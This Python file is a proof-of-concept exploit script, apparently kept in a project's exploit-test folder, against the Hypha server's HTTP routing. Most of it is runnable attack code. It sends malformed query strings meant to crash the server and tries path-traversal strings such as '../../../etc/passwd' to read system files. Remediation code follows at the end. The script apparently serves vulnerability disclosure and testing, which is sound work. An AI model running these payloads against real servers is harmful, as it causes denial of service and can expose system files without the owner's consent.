#!/usr/bin/env python3
"""
V20 Proof-of-Concept Exploit: Server Crash via Malformed Query String

This demonstrates how V20 (Missing HTTP Input Validation) can crash
the Hypha server with a simple HTTP request.

Vulnerability: hypha/http.py:280-283
The code uses naive query string parsing:
    _mode = dict([q.split("=") for q in query.split("&")]).get("_mode")

This crashes when query parameters don't contain "=" because:
1. "malformed".split("=") returns ["malformed"] (single element)
2. dict() expects 2-element tuples
3. ValueError is raised, crashing the server

Usage:
    python tests/exploits/v20_crash_server.py http://target-server:9527

Impact: Denial of Service - server crashes and requires restart

Severity: HIGH
CVSS Score: 7.5 (High)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: None
- Impact: Availability (High)
"""

import httpx
import sys
import asyncio
from typing import List, Tuple


async def exploit_v20_crash(server_url: str) -> bool:
    """
    Crash server with malformed query string.

    Args:
        server_url: Target Hypha server URL

    Returns:
        True if server crashed, False otherwise
    """

    # Malformed query strings that will crash the server
    # These don't require authentication or valid workspace/service IDs
    malformed_queries = [
        "malformed",  # No "=" - causes list unpacking error
        "key1&key2",  # Multiple params without "="
        "=value",  # Empty key (may also crash)
        "key1=value&malformed&key2=value",  # Mixed valid/invalid
        "a&b&c&d&e",  # Multiple malformed params
    ]

    # We can use any workspace/service path - the crash happens before validation
    test_paths = [
        "/public/apps/test-service/path",
        "/workspace/apps/service/index",
        "/test/apps/dummy/api",
    ]

    print("=" * 70)
    print("V20 Exploit: Server Crash via Malformed Query String")
    print("=" * 70)
    print(f"Target: {server_url}")
    print(f"Vulnerability: Missing input validation in ASGIRoutingMiddleware")
    print(f"Impact: Server crash (DoS)")
    print("=" * 70)
    print()

    crashed = False

    async with httpx.AsyncClient() as client:
        for path in test_paths:
            for i, query in enumerate(malformed_queries, 1):
                url = f"{server_url}{path}?{query}"

                print(f"[{i}] Testing: {url}")

                try:
                    response = await client.get(url, timeout=5.0)

                    print(f"    Status: {response.status_code}")

                    if response.status_code == 500:
                        print("    [!] Server returned 500 Internal Server Error")
                        error_text = response.text[:300]
                        print(f"    Error preview: {error_text}")

                        # Check if it's the expected crash
                        if "ValueError" in error_text or "split" in error_text:
                            print("    [!] CONFIRMED: Query parsing crash detected!")
                            crashed = True

                except httpx.TimeoutException:
                    print("    [!] Request timed out - server may be unresponsive!")
                    crashed = True

                except httpx.ConnectError as e:
                    print("    [!] Connection failed - server crashed!")
                    print(f"    [!] Error: {e}")
                    print("    [!] EXPLOIT SUCCESSFUL - Server is down")
                    crashed = True
                    break

                except Exception as e:
                    print(f"    [!] Unexpected error: {type(e).__name__}: {e}")

                print()

            if crashed:
                break

    print("=" * 70)
    if crashed:
        print("EXPLOIT RESULT: SUCCESS - Server crashed or became unresponsive")
        print("IMPACT: Denial of Service - server requires restart")
    else:
        print("EXPLOIT RESULT: FAILED - Server survived all attempts")
        print("NOTE: Server may be patched or unreachable")
    print("=" * 70)

    return crashed


async def test_path_traversal(server_url: str) -> List[Tuple[str, bool]]:
    """
    Test path traversal vulnerability (also part of V20).

    Args:
        server_url: Target Hypha server URL

    Returns:
        List of (path, vulnerable) tuples
    """

    print("\n" + "=" * 70)
    print("V20 Additional Test: Path Traversal")
    print("=" * 70)
    print()

    traversal_paths = [
        "../../../etc/passwd",
        "legitimate/../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
        "....//....//etc//passwd",  # Double dots/slashes
    ]

    results = []

    async with httpx.AsyncClient() as client:
        for path in traversal_paths:
            url = f"{server_url}/public/apps/test/{path}"

            print(f"Testing: {url}")

            try:
                response = await client.get(url, timeout=5.0)

                if response.status_code == 200:
                    # Check if we got actual file content
                    content = response.text.lower()
                    vulnerable = ("root:" in content or
                                "/etc/passwd" in content or
                                ".." in content)

                    if vulnerable:
                        print(f"    [!] VULNERABLE: Path traversal succeeded!")
                        print(f"    Response preview: {response.text[:100]}")
                    else:
                        print(f"    OK: Path was normalized")

                    results.append((path, vulnerable))
                else:
                    print(f"    Status: {response.status_code} (blocked)")
                    results.append((path, False))

            except Exception as e:
                print(f"    Error: {e}")
                results.append((path, False))

            print()

    return results


def print_remediation():
    """Print remediation advice."""

    print("\n" + "=" * 70)
    print("REMEDIATION STEPS")
    print("=" * 70)
    print("""
1. Fix query string parsing in hypha/http.py:

   # BEFORE (vulnerable):
   _mode = dict([q.split("=") for q in query.split("&")]).get("_mode")

   # AFTER (secure):
   from urllib.parse import parse_qs
   query_params = parse_qs(query) if query else {}
   _mode = query_params.get("_mode", [None])[0]

2. Add workspace validation:

   import re
   if not re.match(r'^[a-zA-Z0-9_-]+$', workspace):
       return await self._send_error(send, 400, "Invalid workspace")

3. Add path normalization:

   from pathlib import Path
   try:
       normalized = str(Path("/" + path).resolve())
       if ".." in normalized or not normalized.startswith("/"):
           return await self._send_error(send, 400, "Invalid path")
   except:
       return await self._send_error(send, 400, "Invalid path")

4. Add proper error handling helper:

   async def _send_error(self, send, status, message):
       await send({
           "type": "http.response.start",
           "status": status,
           "headers": [[b"content-type", b"text/plain"]],
       })
       await send({
           "type": "http.response.body",
           "body": message.encode(),
           "more_body": False,
       })

See CLAUDE.md for complete fix implementation.
""")


async def main():
    """Main exploit function."""

    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} http://server:port")
        print(f"Example: {sys.argv[0]} http://localhost:9527")
        sys.exit(1)

    server_url = sys.argv[1].rstrip("/")

    # Test query string crash
    crashed = await exploit_v20_crash(server_url)

    # Test path traversal (if server still up)
    if not crashed:
        traversal_results = await test_path_traversal(server_url)

        vulnerable_count = sum(1 for _, vuln in traversal_results if vuln)
        if vulnerable_count > 0:
            print(f"\n[!] Path traversal: {vulnerable_count}/{len(traversal_results)} attempts successful")

    # Print remediation steps
    print_remediation()

    # Exit code: 0 if exploit succeeded, 1 otherwise
    sys.exit(0 if crashed else 1)


if __name__ == "__main__":
    asyncio.run(main())
